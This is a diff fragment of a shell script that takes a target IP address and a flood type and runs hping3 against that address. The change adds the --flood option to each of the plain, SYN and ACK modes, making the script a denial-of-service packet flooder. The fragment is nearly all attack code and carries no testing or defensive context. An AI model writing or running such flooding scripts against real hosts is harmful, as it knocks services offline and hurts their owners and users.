@@ -13,14 +13,14 @@ echo "Usage: "$0" IPaddr type_of_flood"
 exit
 fi
 
-if [ $type_of_flood = 'ping' ]; then
-sudo hping3 --faster $IPaddr
+if [ $type_of_flood = 'tcp' ]; then
+sudo hping3 --faster --flood $IPaddr
 else
  if [ $type_of_flood = "syn" ]; then
-sudo hping3 --syn --faster $IPaddr
+sudo hping3 --syn --faster --flood $IPaddr
 else
  if [ $type_of_flood = "ack" ]; then
-sudo hping3 --ack --faster $IPaddr
+sudo hping3 --ack --faster --flood $IPaddr
 fi
 fi
 fi
